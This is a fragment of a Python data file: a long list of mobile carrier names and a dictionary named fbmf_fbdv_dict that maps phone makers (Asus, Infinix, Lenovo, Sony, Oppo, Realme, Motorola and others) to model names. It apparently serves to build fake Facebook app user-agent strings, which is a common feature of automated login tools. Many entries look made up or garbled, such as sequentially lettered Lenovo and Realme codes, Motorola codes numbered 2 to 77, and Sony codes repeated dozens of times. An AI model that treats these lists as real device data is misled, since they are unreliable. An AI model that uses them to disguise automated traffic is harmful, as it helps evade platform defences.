                'Banglalink',
                'Teletalk',
                'Ollo',
                'Banglalion',
                'Sunbeach',
                'Ozone Wireless',
                'Velcom',
                'Life',
                'BeCloud',
                'BASE',
                'Moov',
                'Libercom',
                'BBcom',
                'Cell One',
                'B-Mobile',
                'TashiCell',
                'Entel',
                'CHIPPIE',
                'BH Telecom',
                'HT Eronet',
                'Mascom',
                'BeMobile',
                'Nextel',
                'Algar Telecom',
                'Sercomtel',
                'SurfTelecom',
                'Porto Conecta',
                'Mais AD',
                'Correios Celular',
                'CCT',
                'DSTCom',
                'Progresif cellular',
                'Bulsatcom',
                'Telmob',
                'Econet',
                'Lumitel',
                'ONAMOB',
                'CV Móvel',
                'T-MAIS',
                'Metfone',
                'Cellcard',
                'Seatel',
                'Cootel',
                'Nexttel',
                'Camtel',
                'YooMee',
                'Freedom Mobile',
                'Vidéotron',
                'SaskTel',
                'TNW Wireless',
                'Nationlink',
                'WOM',
                'Virgin Mobile',
                'VTR Móvil',
                'Falabella Móvil',
                'Simple',
                'Telsur',
                'Netline',
                'Interexport',
                'China Unicom',
                'China Telecom',
                'Avantel',
                'Comores Telecom',
                'Comoro Gulf Holding',
                'Azur',
                'Tuyo Móvil',
                'Fullmóvil',
                'Koz',
                'GreenN',
                'Warid',
                'Mobile Cafe',
                'Hrvatski Telekom',
                'Vip',
                'Cubacel',
                'CYTA',
                'PrimeTel',
                'Cablenet',
                'Africell',
                'SemaTel',
                'U-Com',
                'Smile',
                'TDC',
                'Net 1',
                'Evatis',
                'Altice GSM',
                'Altice CDMA',
                'CNT',
                'We',
                'Gecomsa',
                'Eritel',
                'Elisa',
                'Ethiotelecom',
                'Sure',
                'Føroya Tele',
                'Ålcom',
                'Ukko Mobile',
                'SFR',
                'VINI',
                'Mara Telecom',
                'Libertis',
                'Azur',
                'Comium',
                'Gamcel',
                'MagtiCom',
                'Geocell',
                'Silknet',
                'Expresso Telecom',
                'IT&E',
                'Docomo Pacific',
                'GTA',
                'iConnect',
                'JT Global',
                'Intercel',
                'Sotelgui',
                'NATCOM',
                'SmarTone',
                'Birdie Mobile',
                'Sun Mobile',
                'Síminn',
                'Nova',
                'IceCell',
                'Reliance Jio',
                'BSNL Mobile',
                'Smartfren',
                'Hamrahe',
                'Irancell',
                'RighTel',
                'Zain',
                'Korek',
                'Omnnea',
                'Itisaluna',
                'Eircell',
                'Eir',
                'Manx Telecom',
                'Sure Mobile',
                'Cellcom',
                'Partner',
                'Pelephone',
                'Golan Telecom',
                'Hot Mobile',
                'Rami Levy',
                '019 Telzar',
                'Cellact',
                'WIND 3',
                'Omnitel',
                'Iliad',
                'Caricel',
                'NTT Docomo',
                'au',
                'SoftBank Corp',
                'Y!Mobile',
                'Disney Mobile',
                'b-mobile',
                'Umniah',
                'Kcell',
                'Altel',
                'Safaricom',
                'TSKL',
                'Vala',
                'IPKO Telecommunications LLC',
                'Z mobile',
                'mts',
                'D3 mobile',
                'Wataniya',
                'MegaCom',
                'Fonex',
                'O!',
                'Katel',
                'Nexi',
                'Sapat Mobile',
                'SRR',
                'FREE',
                'LaoTelecom',
                'ETL',
                'Sky Telecom',
                'LMT',
                'Bite',
                'Triatel',
                'Touch',
                'Alfa',
                'Vodacom',
                'Econet Ezi-Cel',
                'Lonestar Cell',
                'Cellcom',
                'Novafone',
                'Comium',
                'Libtelco',
                'Almadar Aljadid',
                'Libyana',
                'FL1',
                'Mobilkom Liechtenstein AG',
                'Salt',
                'Swisscom',
                'Lietuvos radijo ir televizijos centras',
                'MEZON',
                'POST',
                'Tango',
                'LOL Mobile',
                'CTM',
                'China Telecom',
                'SmarTone',
                'MOBIMAK',
                'Telma Mobile',
                'Blueline',
                'bip Madagascar',
                'TNM',
                'G-Mobile',
                'Lacell',
                'G-Expresso',
                'Celcom',
                'U Mobile',
                'Yes 4G',
                'Unifi Mobile',
                'ALTEL',
                'Redtone',
                'TuneTalk',
                'XOX',
                'redONE',
                'Merchantrade',
                'Tron',
                'SpeakOut Wireless',
                'MY Evolution',
                'Smart Pinoy',
                'Buzzme',
                'FRiENDi Mobile',
                'Telin Malaysia',
                'U Mobile',
                'mCalls',
                'Yoodoo',
                'ookyo',
                'Tapp',
                'Dhiraagu',
                'Sotelma-Malitel',
                'Planor',
                'Telecell',
                'GO',
                'Melita',
                'Mauritel',
                'Chinguitel',
                'MATTEL',
                'Emtel',
                'CHiLi',
                'QBO Cel',
                'weex',
                'Cierto',
                'Maz Tiempo',
                'Oui Móvil',
                'Flash Mobile',
                'FSM Telecom',
                'Moldcell',
                'Unité',
                'Interdnestrcom',
                'Monaco Telecom',
                'Mobicom',
                'Promonte',
                'Monet',
                'm:tel',
                'Maroc Telecom',
                'inwi',
                'Movitel',
                'MPT',
                'Mytel',
                'TN Mobile',
                'Cell One',
                'Leo',
                'Mobilis',
                '2degrees',
                'Black+White',
                'Warehouse Mobile',
                'Slingshot',
                'Skinny',
                'Compass Mobile',
                'Sonitel',
                'Moov',
                '9mobile',
                'Visafone',
                'Multilinks Telkom',
                'Telecom Niue',
                'Norfolk Telecom',
                'Koryolink',
                'Docomo Pacific',
                'IT&E',
                'NetCom',
                'Omantel',
                'Nawras',
                'Ufone',
                'PNCC',
                'Jawwal',
                'Wataniya',
                'Cable & Wireless',
                'BMobile',
                'Telikom',
                'VOX',
                'Entel',
                'Nextel',
                'Plus',
                'MEO',
                'Open Mobile',
                'Choice Communications',
                'TracFone Wireless',
                'Qtel',
                'Connex',
                'Dialog',
                'Cosmorom',
                'Sotovaja',
                'SMARTS',
                'Tattelecom',
                'Vainahtelecom',
                'Sotovaja Svjaz Bashkortostana',
                'Rwandatel',
                'CHIPPIE',
                'Telefonia Mobile Sammarinese',
                'San Marino Telecom',
                'CST',
                'STC',
                'Mobily',
                'Bravo',
                'Lebara KSA',
                'Expresso',
                'Hayo Telecom',
                'Africell',
                'Sierratel',
                'Comium',
                'GreenN',
                'StarHub',
                'M1',
                'GRID',
                'Circles.Life',
                'Zero Mobile',
                'Zero1',
                'MyRepublic',
                'Globtel',
                'Slovtel',
                'Eurotel',
                'SWAN Mobile',
                '4KA',
                'Telemach',
                'T-2',
                'Our Telekom',
                'Hormuud',
                'Telcom',
                'Telesom',
                'Nationlink',
                'Somtel',
                'Golis Telecom',
                'Somafone',
                'Netco',
                'Cell C',
                'KT',
                'Olleh',
                'KTF',
                'LG U+',
                'Sudani',
                'Vivacell',
                'Gemtel',
                'Yoigo',
                'Celltel',
                'Millicom',
                'Hutch',
                'Canar',
                'Telesur',
                'Sunrise',
                'diAx',
                'Salt',
                'Syriatel',
                'Chunghwa Telecom',
                'Taiwan Mobile',
                'FarEasTone',
                'Asia Pacific Telecom GT 4G',
                'T STAR',
                'Tcell',
                'Babilon Mobile',
                'MLT',
                'Zantel',
                'TTCL Mobile',
                'Benson Informatics',
                'MyCell',
                'Excellentcom',
                'MyCell',
                'Excellentcom',
                'Egotel',
                'Smile Communications',
                'Halotel',
                'TrueMove H',
                'dtac',
                'Line Mobile',
                'TOT',
                'MY',
                'Buzzme',
                'i-Kool',
                'Mojo',
                '168',
                'My World 3G',
                'Penguin',
                'Timor Telecom',
                'Telkomcel',
                'Togocel',
                'Moov',
                'TCC',
                'bmobile',
                'Tunisiana',
                'Tunisie Telecom',
                'Turkcell',
                'Telsim',
                'Avea',
                'Aria',
                'Aycell',
                'TM CELL',
                'TTC',
                'Africell',
                'UT Mobile',
                'Essar',
                'Kyivstar',
                'Lifecell',
                'Intertelecom',
                'Life',
                'TriMob',
                'PEOPLEnet',
                'MetroPCS',
                'Cricket',
                'U.S. Cellular',
                'Antes',
                'UCell',
                'Coscom',
                'UMS',
                'Uzmobile',
                'Perfectum',
                'AIL',
                'WanTok',
                'Movilnet',
                'Digitel GSM',
                'MobiFone',
                'Vietnamobile',
                'S-Fone',
                'Spacetel',
                'Sabafon',
                'Yemen Mobile',
                'HiTS-UNITEL',
                'ZAMTEL',
                'Econet',
                'Net One',
                'Eastlink',
                'Lucky Mobile',
                'Virgin Plus',
                'Magyar Telekom',
                'Strata Networks',
                'Straight Talk',
                'Spectrum Mobile',
                'Red Pocket',
                'PureTalk',
                'Nex-Tech Wireless',
                'H2O Wireless',
                'GCI Alaska',
                'FirstNet',
                'C Spire',
                'Credo Mobile']
            fbmf_fbdv_dict = {
                'Asus': [
                    'ZenFone 8',
                    'ROG Phone 5',
                    'ZenFone 7',
                    'ROG Phone 3',
                    'ZenFone 6',
                    'ROG Phone II',
                    'ZenFone 5Z',
                    'ZenFone 5',
                    'ZenFone 4 Pro',
                    'ZenFone 4',
                    'ZenFone 3 Deluxe',
                    'ZenFone 3',
                    'ZenFone 2 Laser',
                    'ZenFone 2',
                    'ZenFone',
                    'ZenFone 6Z',
                    'ZenFone Max Pro (M2)',
                    'ZenFone Max Pro (M1)',
                    'ZenFone 6Z',
                    'ZenFone Max Plus (M2)',
                    'ZenFone Max (M2)',
                    'ZenFone Max (M1)',
                    'ZenFone Live',
                    'ZenFone Zoom',
                    'ZenFone Selfie'],
                'Infinix': [
                    'X608',
                    'X606B',
                    'X559C',
                    'X510',
                    'X676B',
                    'X687',
                    'X609',
                    'X697',
                    'X680D',
                    'X507',
                    'X605',
                    'X668',
                    'X6815B',
                    'X624',
                    'X655F',
                    'X689C',
                    'X608',
                    'X698',
                    'X682B',
                    'X682C',
                    'X688C',
                    'X688B',
                    'X658E',
                    'X659B',
                    'X689B',
                    'X689',
                    'X689D',
                    'X662',
                    'X662B',
                    'X675',
                    'X6812B',
                    'X6812',
                    'X6817B',
                    'X6817',
                    'X6816C',
                    'X6816',
                    'X6816D',
                    'X668C',
                    'X665B',
                    'X665E',
                    'X510',
                    'X559C',
                    'X559F',
                    'X559',
                    'X606',
                    'X606C',
                    'X606D',
                    'X623',
                    'X624B',
                    'X625C',
                    'X625D',
                    'X625B',
                    'X650D',
                    'X650B',
                    'X650',
                    'X650C',
                    'X655C',
                    'X655D',
                    'X680B',
                    'X573',
                    'X573B',
                    'X622',
                    'X693',
                    'X695C',
                    'X695D',
                    'X695',
                    'X663B',
                    'X663',
                    'X670',
                    'X671',
                    'X671B',
                    'X672',
                    'X6819',
                    'X572',
                    'X572-LTE',
                    'X571',
                    'X604',
                    'X610B',
                    'X690',
                    'X690B',
                    'X656',
                    'X692',
                    'X683',
                    'X450',
                    'X5010',
                    'X501',
                    'X401',
                    'X626',
                    'X626B',
                    'X652',
                    'X652A',
                    'X652B',
                    'X652C',
                    'X660B',
                    'X660C',
                    'X660',
                    'X5515',
                    'X5515F',
                    'X5515I',
                    'X609B',
                    'X5514D',
                    'X5516B',
                    'X5516C',
                    'X627',
                    'X680',
                    'X653',
                    'X653C',
                    'X657',
                    'X657B',
                    'X657C',
                    'X6511B',
                    'X6511E',
                    'X6511',
                    'X6512',
                    'X6823C',
                    'X612B',
                    'X612',
                    'X503',
                    'X511',
                    'X352',
                    'X351',
                    'X530',
                    'X676C',
                    'X6821',
                    'X6823',
                    'X6827',
                    'X509',
                    'X603',
                    'X6815',
                    'X620B',
                    'X620',
                    'X687B',
                    'X6811B',
                    'X6810',
                    'X6811'],
                'Itel': [
                    'S41',
                    'S31',
                    'S21',
                    'S12',
                    'S11',
                    'A56',
                    'A55',
                    'A54',
                    'A23',
                    'A16',
                    'A15',
                    'P36 Pro',
                    'P36',
                    'P33 Plus',
                    'P33',
                    'P32',
                    'P31',
                    'A88',
                    'A47',
                    'A46',
                    'A45',
                    'A44',
                    'A41 Plus',
                    'A41',
                    'A25 Pro',
                    'A25',
                    'A23 Pro',
                    'A22 Pro',
                    'A22',
                    'A21',
                    'A16 Plus',
                    'A16S',
                    'A16',
                    'A14',
                    'A13 Plus',
                    'A13',
                    'A11',
                    'A10',
                    'Vision 1 Plus',
                    'Vision 1',
                    'S13 Pro',
                    'S13',
                    'S12 Lite',
                    'S11 Lite',
                    'S11 Pro',
                    'S11 Plus',
                    'S10',
                    'S15',
                    'S14',
                    'S13P',
                    'S12',
                    'S11',
                    'S10',
                    'S15',
                    'S14',
                    'S13P',
                    'S12',
                    'S11',
                    'S10',
                    'S15',
                    'S14',
                    'S13P',
                    'S12',
                    'S11',
                    'S10'],
                'Tecno': [
                    'Camon 16 Premier',
                    'Camon 16 Pro',
                    'Camon 16',
                    'Camon 15 Premier',
                    'Camon 15 Pro',
                    'Camon 15',
                    'Spark 6',
                    'Spark 5 Pro',
                    'Spark 5',
                    'Pova',
                    'Pouvoir 4 Pro',
                    'Pouvoir 4',
                    'Phantom 9',
                    'Phantom X',
                    'Camon 12 Pro',
                    'Camon 12',
                    'Camon 11',
                    'Camon 11 Pro',
                    'Camon 11S',
                    'Spark 4',
                    'Spark 4 Air',
                    'Spark 3 Pro',
                    'Spark 3',
                    'Spark 2',
                    'Pouvoir 3 Plus',
                    'Pouvoir 3',
                    'Phantom 8',
                    'Phantom 6',
                    'Phantom 6 Plus',
                    'Camon X Pro',
                    'Camon X',
                    'Camon CM',
                    'Camon CX Air',
                    'Camon CX',
                    'Spark Plus K9',
                    'Spark K7',
                    'Spark Plus K9',
                    'Spark K7 Plus',
                    'Boom J8',
                    'Boom J7',
                    'Boom J5',
                    'Boom J9 Plus',
                    'Boom J10',
                    'Pop 3',
                    'Pop 2 Plus',
                    'Pop 2 Power',
                    'Pop 2F',
                    'Pop 1',
                    'F1',
                    'F2',
                    'F3',
                    'F4',
                    'F5'],
                'Lenovo': [
                    'Legion Phone Duel 2',
                    'Legion Phone Duel',
                    'K12 Note',
                    'K10 Note',
                    'Z6 Pro',
                    'Z5 Pro',
                    'Z6 Pro',
                    'Z6 Youth',
                    'Z5s',
                    'Z5 Pro GT',
                    'Z5 Pro',
                    'Z5',
                    'K9',
                    'A5',
                    'K320t',
                    'K8 Note',
                    'K6 Note',
                    'Vibe K5 Note',
                    'Vibe K5',
                    'Vibe P1',
                    'Vibe X3',
                    'Vibe Z2 Pro',
                    'Vibe Z2',
                    'Vibe Z',
                    'A6000',
                    'A6000 Plus',
                    'A7000',
                    'A7000 Turbo',
                    'A2010',
                    'A2010-a',
                    'K3 Note',
                    'Vibe K4 Note',
                    'Vibe K5 Note',
                    'Vibe K5 Plus',
                    'Vibe K5',
                    'Vibe K5 Lite',
                    'Vibe K5 Power',
                    'Vibe K5 S',
                    'Vibe X2',
                    'Vibe X3',
                    'Vibe Z2 Pro',
                    'K6 Power',
                    'K6 Note',
                    'K6',
                    'K6 Plus',
                    'K6 Turbo',
                    'Vibe C',
                    'Vibe C2',
                    'Vibe C2 Power',
                    'Vibe C2 K10a40',
                    'Vibe C2 K10a40C',
                    'Vibe B',
                    'Vibe B A2016a40',
                    'Vibe B A2016b30',
                    'Vibe B A2016b31',
                    'Vibe B A2016b31C',
                    'Vibe B A2016b30A',
                    'Vibe B A2016b30B',
                    'Vibe B A2016b30C',
                    'Vibe B A2016b30D',
                    'Vibe B A2016b30E',
                    'Vibe B A2016b30G',
                    'Vibe B A2016b30J',
                    'Vibe B A2016b30K',
                    'Vibe B A2016b30L',
                    'Vibe B A2016b30M',
                    'Vibe B A2016b30N',
                    'Vibe B A2016b30O',
                    'Vibe B A2016b30Q',
                    'Vibe B A2016b30R',
                    'Vibe B A2016b30T',
                    'Vibe B A2016b30W',
                    'Vibe B A2016b30Y',
                    'Vibe B A2016b31A',
                    'Vibe B A2016b31B',
                    'Vibe B A2016b31C',
                    'Vibe B A2016b31E',
                    'Vibe B A2016b31F',
                    'Vibe B A2016b31G',
                    'Vibe B A2016b31H',
                    'Vibe B A2016b31K',
                    'Vibe B A2016b31L',
                    'Vibe B A2016b31M',
                    'Vibe B A2016b31N',
                    'Vibe B A2016b31O',
                    'Vibe B A2016b31P',
                    'Vibe B A2016b31Q',
                    'Vibe B A2016b31R',
                    'Vibe B A2016b31S',
                    'Vibe B A2016b31T',
                    'Vibe B A2016b31U',
                    'Vibe B A2016b31V',
                    'Vibe B A2016b31W',
                    'Vibe B A2016b31X',
                    'Vibe B A2016b31Y',
                    'Vibe B A2016b31Z',
                    'Vibe B A2016b31AA',
                    'Vibe B A2016b31AB',
                    'Vibe B A2016b31AC',
                    'Vibe B A2016b31AD',
                    'Vibe B A2016b31AE',
                    'Vibe B A2016b31AF',
                    'Vibe B A2016b31AG',
                    'Vibe B A2016b31AH',
                    'Vibe B A2016b31AI',
                    'Vibe B A2016b31AJ',
                    'Vibe B A2016b31AK',
                    'Vibe B A2016b31AL',
                    'Vibe B A2016b31AM',
                    'Vibe B A2016b31AN',
                    'Vibe B A2016b31AO',
                    'Vibe B A2016b31AP',
                    'Vibe B A2016b31AQ',
                    'Vibe B A2016b31AR',
                    'Vibe B A2016b31AS',
                    'Vibe B A2016b31AT',
                    'Vibe B A2016b31AU',
                    'Vibe B A2016b31AV',
                    'Vibe B A2016b31AW',
                    'Vibe B A2016b31AX',
                    'Vibe B A2016b31AY',
                    'Vibe B A2016b31AZ',
                    'Vibe B A2016b31BA',
                    'Vibe B A2016b31BB',
                    'Vibe B A2016b31BC',
                    'Vibe B A2016b31BD',
                    'Vibe B A2016b31BE',
                    'Vibe B A2016b31BF',
                    'Vibe B A2016b31BG',
                    'Vibe B A2016b31BH',
                    'Vibe B A2016b31BI',
                    'Vibe B A2016b31BJ',
                    'Vibe B A2016b31BK',
                    'Vibe B A2016b31BL',
                    'Vibe B A2016b31BM',
                    'Vibe B A2016b31BN',
                    'Vibe B A2016b31BO',
                    'Vibe B A2016b31BP',
                    'Vibe B A2016b31BQ',
                    'Vibe B A2016b31BR',
                    'Vibe B A2016b31BS'],
                'Sony': [
                    'Xperia 5 III',
                    'Xperia 10 II',
                    'Xperia 1 II',
                    'Xperia 10 Plus',
                    'Xperia 1',
                    'Xperia XZ3',
                    'Xperia 1 III',
                    'Xperia 1 II',
                    'Xperia 1',
                    'Xperia 5 III',
                    'Xperia 5 II',
                    'Xperia 5',
                    'Xperia 10 III',
                    'Xperia 10 II',
                    'Xperia 10',
                    'Xperia Pro',
                    'Xperia L4',
                    'Xperia L3',
                    'Xperia XZ3',
                    'Xperia XZ2 Premium',
                    'Xperia XZ2',
                    'Xperia XZ1 Compact',
                    'Xperia XZ1',
                    'Xperia XZ Premium',
                    'Xperia XZ',
                    'Xperia XA2 Ultra',
                    'Xperia XA2',
                    'Xperia XA1 Ultra',
                    'Xperia XA1 Plus',
                    'Xperia XA1',
                    'Xperia X Compact',
                    'C6603',
                    'D6503',
                    'F5121',
                    'F8331',
                    'G3116',
                    'H3113',
                    'J9210',
                    'XQ-AS52',
                    'XQ-AD52',
                    'XQ-BT52',
                    'XQ-BS52',
                    'XQ-AT51',
                    'XQ-AT52',
                    'XQ-AD52',
                    'XQ-AT52',
                    'XQ-AT42',
                    'XQ-AT41',
                    'XQ-AD51',
                    'XQ-BT51',
                    'XQ-BS41',
                    'XQ-BS52',
                    'XQ-BT52',
                    'XQ-AD51',
                    'XQ-BT51',
                    'XQ-BS41',
                    'XQ-AT41',
                    'XQ-BS52',
                    'XQ-BT52',
                    'XQ-AS42',
                    'XQ-BS42',
                    'XQ-AT42',
                    'XQ-BS41',
                    'XQ-AT51',
                    'XQ-AD51',
                    'XQ-AD42',
                    'XQ-AS41',
                    'XQ-BT41',
                    'XQ-BT51',
                    'XQ-BS51',
                    'XQ-BS42',
                    'XQ-AS52',
                    'XQ-AS41',
                    'XQ-BS42',
                    'XQ-BT41',
                    'XQ-AS42',
                    'XQ-AT42',
                    'XQ-AD42',
                    'XQ-BS41',
                    'XQ-AT41',
                    'XQ-BS51',
                    'XQ-BT51',
                    'XQ-AT51',
                    'XQ-AD51',
                    'F8131',
                    'F8132',
                    'G3121',
                    'G3112',
                    'G3123',
                    'G3125',
                    'G8141',
                    'G8142',
                    'G8341',
                    'G8342',
                    'H8216',
                    'H8266',
                    'H8296',
                    'H8416',
                    'H9436',
                    'H9461',
                    'H9436',
                    'H9461',
                    'H9436',
                    'H9493',
                    'H8541',
                    'H8526',
                    'H8116',
                    'H8166',
                    'I4213',
                    'I4293',
                    'I4293',
                    'I4312',
                    'I4332',
                    'I4332',
                    'I4113',
                    'I4193',
                    'I4213',
                    'I4312',
                    'I4332',
                    'I4293',
                    'I4293',
                    'I4213',
                    'I4312',
                    'I4332',
                    'I4312',
                    'I4332',
                    'I4293',
                    'I4293',
                    'I4213',
                    'I4312',
                    'I4332',
                    'I4293',
                    'I4293',
                    'I4213',
                    'I4312',
                    'I4332',
                    'I4312',
                    'I4332',
                    'I4293',
                    'I4293',
                    'I4213',
                    'I4312',
                    'I4332',
                    'I4293',
                    'I4293',
                    'I4213',
                    'I4312',
                    'I4332',
                    'I4312',
                    'I4332',
                    'I4293',
                    'I4293',
                    'I4213',
                    'I4312',
                    'I4332',
                    'I4293',
                    'I4293',
                    'I4213',
                    'I4312',
                    'I4332',
                    'I4312',
                    'I4332',
                    'I4293',
                    'I4293',
                    'I4213',
                    'I4312',
                    'I4332',
                    'I4293',
                    'I4293',
                    'I4213'],
                'Oppo': [
                    'Reno 7 Pro',
                    'Reno 7',
                    'Reno 6 Pro+',
                    'A95',
                    'A96',
                    'A93',
                    'Find X3 Pro',
                    'Find X2 Pro',
                    'Find X2',
                    'Reno 6 Pro+',
                    'Reno 6 Pro',
                    'Reno 6',
                    'Reno 5 Pro+',
                    'Reno 5 Pro',
                    'Reno 5',
                    'A94',
                    'A74',
                    'F19 Pro+',
                    'F19 Pro',
                    'F19',
                    'A93',
                    'A53',
                    'A33',
                    'A32',
                    'A72',
                    'A52',
                    'A92',
                    'A12',
                    'Reno 3 Pro',
                    'Reno 3',
                    'Reno 2',
                    'Reno',
                    'K7x',
                    'K7',
                    'A9 (2020)',
                    'A5 (2020)',
                    'CPH1903',
                    'CPH1803',
                    'CPH1859',
                    'CPH1969',
                    'CPH1989',
                    'CPH1919',
                    'CPH1941',
                    'CPH1983',
                    'CPH1963',
                    'CPH1879',
                    'CPH1831',
                    'CPH2035',
                    'CPH2069',
                    'CPH1987',
                    'CPH2071',
                    'CPH2083',
                    'CPH2015',
                    'CPH2019',
                    'CPH2173',
                    'CPH2089',
                    'CPH2067',
                    'CPH2017',
                    'CPH2087',
                    'CPH2205',
                    'CPH2251',
                    'CPH2197',
                    'CPH2235',
                    'CPH2347',
                    'CPH2295',
                    'CPH2249',
                    'CPH2243',
                    'CPH2349',
                    'CPH2359',
                    'CPH2383',
                    'CPH2381',
                    'CPH2239',
                    'CPH2213',
                    'CPH2129',
                    'CPH2195',
                    'CPH2227',
                    'CPH2316',
                    'CPH2353',
                    'CPH2261',
                    'CPH2225',
                    'CPH2269',
                    'CPH2073',
                    'CPH2185',
                    'CPH1877',
                    'CPH2013',
                    'CPH2061',
                    'CPH1955',
                    'CPH1871',
                    'CPH1801',
                    'CPH1873',
                    'CPH1901',
                    'CPH1809',
                    'CPH1853',
                    'CPH1923',
                    'CPH1981',
                    'CPH1833',
                    'CPH1917',
                    'CPH1967',
                    'CPH1937',
                    'CPH1893',
                    'CPH1931',
                    'CPH1921',
                    'CPH1823',
                    'CPH2023',
                    'CPH2021',
                    'CPH2103',
                    'CPH2220',
                    'CPH2127',
                    'CPH2059',
                    'CPH2139',
                    'CPH2253',
                    'CPH2267',
                    'CPH2263',
                    'CPH2247',
                    'CPH2241',
                    'CPH2297',
                    'CPH2357',
                    'CPH2255',
                    'CPH2345',
                    'CPH2329',
                    'CPH2209',
                    'CPH2191',
                    'CPH2199',
                    'CPH2289',
                    'CPH2319',
                    'CPH2343',
                    'CPH2363',
                    'CPH2161',
                    'CPH2163',
                    'CPH1979',
                    'CPH1977',
                    'CPH1973',
                    'CPH1965',
                    'CPH1959',
                    'CPH1951',
                    'CPH1913',
                    'CPH1909',
                    'CPH1905',
                    'CPH1861',
                    'CPH1863',
                    'CPH1967',
                    'CPH1933',
                    'CPH1937',
                    'CPH1921',
                    'CPH1923',
                    'CPH1987',
                    'CPH1919',
                    'CPH1897',
                    'CPH1875',
                    'CPH1874',
                    'CPH1872',
                    'CPH1865',
                    'CPH1863',
                    'CPH1862',
                    'CPH1853',
                    'CPH1852',
                    'CPH1851',
                    'CPH1843',
                    'CPH1841',
                    'CPH1835',
                    'CPH1833',
                    'CPH1832',
                    'CPH1831',
                    'CPH1825',
                    'CPH1823',
                    'CPH1821',
                    'CPH1819',
                    'CPH1813',
                    'CPH1812',
                    'CPH1811',
                    'CPH1809',
                    'CPH1808',
                    'CPH1807',
                    'CPH1805',
                    'CPH1803',
                    'CPH1801'],
                'Realme': [
                    'RMX2111',
                    'RMX3092',
                    'RMX3161',
                    'RMX3142',
                    'RMX3185',
                    'RMX3186',
                    'RMX3281',
                    'RMX3274',
                    'RMX3361',
                    'RMX3165',
                    'RMX3243',
                    'RMX3242',
                    'RMX3294',
                    'RMX3162',
                    'RMX3241',
                    'RMX3290',
                    'RMX3289',
                    'RMX3270',
                    'RMX3267',
                    'RMX3266',
                    'RMX3263',
                    'RMX3260',
                    'RMX3240',
                    'RMX3280',
                    'RMX3276',
                    'RMX3244',
                    'RMX3121',
                    'RMX3063',
                    'RMX3061',
                    'RMX3090',
                    'RMX3091',
                    'RMX3080',
                    'RMX3211',
                    'RMX3334',
                    'RMX3221',
                    'RMX3295',
                    'RMX3292',
                    'RMX3331',
                    'RMX3383',
                    'RMX3350',
                    'RMX3332',
                    'RMX3300',
                    'RMX3310',
                    'RMX3311',
                    'RMX3385',
                    'RMX3336',
                    'RMX3337',
                    'RMX3338',
                    'RMX3235',
                    'RMX3225',
                    'RMX3124',
                    'RMX3065',
                    'RMX3143',
                    'RMX3201',
                    'RMX3070',
                    'RMX3250',
                    'RMX3246',
                    'RMX3261',
                    'RMX3071',
                    'RMX3150',
                    'RMX3164',
                    'RMX3141',
                    'RMX3063',
                    'RMX3060',
                    'RMX3357',
                    'RMX3223',
                    'RMX3330',
                    'RMX3284',
                    'RMX3362',
                    'RMX3236',
                    'RMX3193',
                    'RMX3191',
                    'RMX3358',
                    'RMX3384',
                    'RMX3262',
                    'RMX3248',
                    'RMX3339',
                    'RMX3283',
                    'RMX3195',
                    'RMX3093',
                    'RMX3098',
                    'RMX3245',
                    'RMX3095',
                    'RMX3064',
                    'RMX3341',
                    'RMX3340',
                    'RMX3365',
                    'RMX3363',
                    'RMX3364',
                    'RMX3366',
                    'RMX3367',
                    'RMX3368',
                    'RMX3369',
                    'RMX3370',
                    'RMX3371',
                    'RMX3372',
                    'RMX3373',
                    'RMX3374',
                    'RMX3375',
                    'RMX3376',
                    'RMX3377',
                    'RMX3378',
                    'RMX3379',
                    'RMX3380',
                    'RMX3381',
                    'RMX3382',
                    'RMX3312',
                    'RMX3249',
                    'RMX3094',
                    'RMX3116',
                    'RMX3187',
                    'RMX3096',
                    'RMX3097',
                    'RMX3171',
                    'RMX3152',
                    'RMX3115',
                    'RMX3081',
                    'RMX3272',
                    'RMX3273',
                    'RMX3264',
                    'RMX3265',
                    'RMX3269',
                    'RMX3268',
                    'RMX3082',
                    'RMX3083',
                    'RMX3084',
                    'RMX3085',
                    'RMX3086',
                    'RMX3087',
                    'RMX3088',
                    'RMX3089',
                    'RMX3099',
                    'RMX309A',
                    'RMX309B',
                    'RMX309C',
                    'RMX309D',
                    'RMX309E',
                    'RMX309F',
                    'RMX309G',
                    'RMX309H',
                    'RMX309I',
                    'RMX309J',
                    'RMX309K',
                    'RMX309L',
                    'RMX309M',
                    'RMX309N',
                    'RMX309O',
                    'RMX309P',
                    'RMX309Q',
                    'RMX309R',
                    'RMX309S',
                    'RMX309T',
                    'RMX309U',
                    'RMX309V',
                    'RMX309W',
                    'RMX309X',
                    'RMX309Y',
                    'RMX309Z',
                    'RMX31ZM',
                    'RMX31ZN',
                    'RMX31ZS',
                    'RMX31ZT',
                    'RMX31ZW',
                    'RMX31ZV',
                    'RMX31ZR',
                    'RMX31ZQ',
                    'RMX31ZP',
                    'RMX31ZO',
                    'RMX31ZN',
                    'RMX31ZM',
                    'RMX31ZL',
                    'RMX31ZK',
                    'RMX31ZJ',
                    'RMX31ZI',
                    'RMX31ZH',
                    'RMX31ZG',
                    'RMX31ZF',
                    'RMX31ZE',
                    'RMX31ZD',
                    'RMX31ZC'],
                'Motorola': [
                    'XT2127-2',
                    'XT2127-4',
                    'XT2127-5',
                    'XT2127-6',
                    'XT2127-7',
                    'XT2127-8',
                    'XT2127-10',
                    'XT2127-11',
                    'XT2127-12',
                    'XT2127-13',
                    'XT2127-14',
                    'XT2127-15',
                    'XT2127-16',
                    'XT2127-17',
                    'XT2127-18',
                    'XT2127-19',
                    'XT2127-20',
                    'XT2127-21',
                    'XT2127-22',
                    'XT2127-23',
                    'XT2127-24',
                    'XT2127-25',
                    'XT2127-26',
                    'XT2127-27',
                    'XT2127-28',
                    'XT2127-29',
                    'XT2127-30',
                    'XT2127-31',
                    'XT2127-32',
                    'XT2127-33',
                    'XT2127-34',
                    'XT2127-35',
                    'XT2127-36',
                    'XT2127-37',
                    'XT2127-38',
                    'XT2127-39',
                    'XT2127-40',
                    'XT2127-41',
                    'XT2127-42',
                    'XT2127-43',
                    'XT2127-44',
                    'XT2127-45',
                    'XT2127-46',
                    'XT2127-47',
                    'XT2127-48',
                    'XT2127-49',
                    'XT2127-50',
                    'XT2127-51',
                    'XT2127-52',
                    'XT2127-53',
                    'XT2127-54',
                    'XT2127-55',
                    'XT2127-56',
                    'XT2127-57',
                    'XT2127-58',
                    'XT2127-59',
                    'XT2127-60',
                    'XT2127-61',
                    'XT2127-62',
                    'XT2127-63',
                    'XT2127-64',
                    'XT2127-65',
                    'XT2127-66',
                    'XT2127-67',
                    'XT2127-68',
                    'XT2127-69',
                    'XT2127-70',
                    'XT2127-71',
                    'XT2127-72',
                    'XT2127-73',
                    'XT2127-74',
                    'XT2127-75',
                    'XT2127-76',
                    'XT2127-77',
